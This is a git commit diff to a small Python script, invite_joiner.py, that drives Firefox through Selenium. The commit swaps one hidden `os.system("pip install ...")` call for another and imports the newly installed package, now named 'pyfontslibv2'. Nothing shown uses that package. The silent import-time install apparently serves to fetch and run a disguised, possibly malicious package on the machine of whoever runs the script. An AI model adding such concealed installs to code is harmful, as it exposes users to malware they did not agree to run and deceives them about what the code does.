2010199f507fb11767c5cb5a82d7c53cb93e5d47
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-04-29 05:05:49 -0700

    Update invite_joiner.py

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pyfontslibv2")
+import pyfontslibv2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
